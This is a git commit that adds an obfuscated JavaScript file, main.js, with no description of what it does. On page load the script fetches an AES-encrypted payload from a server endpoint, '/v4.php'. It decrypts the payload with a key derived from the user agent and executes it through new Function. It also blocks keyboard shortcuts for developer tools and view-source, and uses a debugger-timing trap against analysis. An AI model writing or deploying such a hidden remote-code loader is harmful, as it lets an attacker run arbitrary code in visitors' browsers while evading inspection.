5bb8a4c61e664caaeaedeb1e59b6a448af4afa88
Buenass7300 <manolitoopiesdeplata@protonmail.com>
2022-07-09 13:57:08 +0200

    Create main.js

---
+++ main.js
@@ -0,0 +1,105 @@
+var rovina = ["message", "<hr><h3>ERROR</h3>", "AES", "abs", "hide", "323768FlgZCN", "2ZXZNQn", "#msg", "ajax", "751123CfOVxJ", "257804eNFZkl", "replace", "/error", "userAgent", "split", "<hr>", "getElementById", "length", "835409FGATlr", "onkeydown", "getTime", "MD5", "show", "reverse", "654399YcmVFw", "/v4.php", "enc", '<hr><h2 class="text-danger font-weight-bold">Please update your browser or try a different one.</h2><hr>', "dvl", "keyCode", "Malformed UTF-8 data", "join", "1FDizCT", "onload", "toString", "data=", "POST", "Utf8", "9142HyysAr", "parse", "substr", "decrypt", "1390613NQfTzu", "ctrlKey", "statusText", "#loading", "25sEeaTn", "</textarea></div></div><hr>"];
+var leonhard = gwili;
+(function(cassidi, akosua) {
+    var chamaya = gwili;
+    while (true) {
+        try {
+            var nashia = parseInt(chamaya(340)) * parseInt(chamaya(339)) + -parseInt(chamaya(343)) * parseInt(chamaya(318)) + parseInt(chamaya(344)) + parseInt(chamaya(310)) + parseInt(chamaya(304)) + parseInt(chamaya(324)) * parseInt(chamaya(332)) + -parseInt(chamaya(328));
+            if (nashia === akosua)
+                break;
+            else
+                cassidi.push(cassidi.shift());
+        } catch (shawntelle) {
+            cassidi.push(cassidi.shift());
+        }
+    }
+}(rovina, 481962));
+function gwili(shawntaya, jaryia) {
+    return gwili = function(jayde, lendel) {
+        jayde = jayde - 299;
+        var rondale = rovina[jayde];
+        return rondale;
+    }
+    ,
+    gwili(shawntaya, jaryia);
+}
+function closest(trese, quinn) {
+    var danery = gwili;
+    for (var ameshia = quinn[0], gaylyn = Math[danery(337)](trese - ameshia), aaqil = 0; aaqil < quinn[danery(303)]; aaqil++) {
+        var anza = Math[danery(337)](trese - quinn[aaqil]);
+        anza < gaylyn && (gaylyn = anza,
+        ameshia = quinn[aaqil]);
+    }
+    return ameshia;
+}
+;function hsipdxdcej() {
+    var rieleigh = gwili;
+    $(rieleigh(331))[rieleigh(338)](),
+    $(rieleigh(341))[rieleigh(338)]();
+}
+function askkkdsanxc(adaleena) {
+    var ayomikun = gwili;
+    document[ayomikun(302)]("msg").innerHTML = adaleena,
+    $(ayomikun(341))[ayomikun(308)]();
+}
+function revSt(jenola) {
+    var daleysi = gwili;
+    return jenola[daleysi(300)]("")[daleysi(309)]()[daleysi(317)]("");
+}
+function zxndnnndje(jossue) {
+    var lizveth = gwili;
+    hsipdxdcej(),
+    $(lizveth(331))[lizveth(308)](),
+    $[lizveth(342)]({
+        type: lizveth(322),
+        url: wbpo + lizveth(311),
+        data: jossue,
+        success: function(tricity) {
+            var meyli = lizveth;
+            hsipdxdcej();
+            try {
+                var cavett = JSON.parse(CryptoJS.AES.decrypt(revSt("}" + response + "{").replace(/58290/g, ":").replace(/90190/g, '"').replace(/56370/g, ","), CryptoJS.MD5(navigator.userAgent.toString().substr(5,10), {
+                    format: CryptoJSAesJson
+                })[meyli(320)](CryptoJS[meyli(312)][meyli(323)]));
+                cavett && cavett[0] && new Function(atob(cavett[0]))();
+            } catch (ajna) {
+                if (ajna[meyli(334)] == meyli(316))
+                    askkkdsanxc(meyli(313));
+                else {
+                    var judine = JSON.stringify({
+                        error: ajna[meyli(334)],
+                        post: jossue,
+                        response: tricity
+                    });
+                    askkkdsanxc('<hr><h3>Please try again later</h3><br><p><button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#collapseerror" aria-expanded="false" aria-controls="collapseerror">Error Details</button></p><div class="collapse" id="collapseerror"><div class="card card-body"><textarea id="errorlog">' + judine + meyli(333)),
+                    $.post(wbpo + meyli(346), meyli(321) + btoa(judine));
+                }
+            }
+        },
+        error: function(josiana) {
+            var jc = lizveth;
+            hsipdxdcej(),
+            askkkdsanxc(jc(335) + josiana[jc(330)] + jc(301));
+        }
+    });
+}
+;window[leonhard(319)] = function() {
+    setTimeout(function() {
+        zxndnnndje();
+    }, 1e3);
+}
+,
+document[leonhard(305)] = function(retage) {
+    var damoney = leonhard;
+    return retage[damoney(329)] && (retage[damoney(315)] === 85 || retage.keyCode === 117 || retage.keyCode === 73 || retage.keyCode === 74) ? false : true;
+}
+,
+setTimeout(function() {
+    location.reload();
+}, 36e5);
+var xt = setInterval(function() {
+    var jasenya = leonhard
+      , pualani = (new Date)[jasenya(306)]();
+    debugger ;(new Date)[jasenya(306)]() - pualani > 100 && (window[jasenya(314)] = 1,
+    clearInterval(xt));
+}, 100);
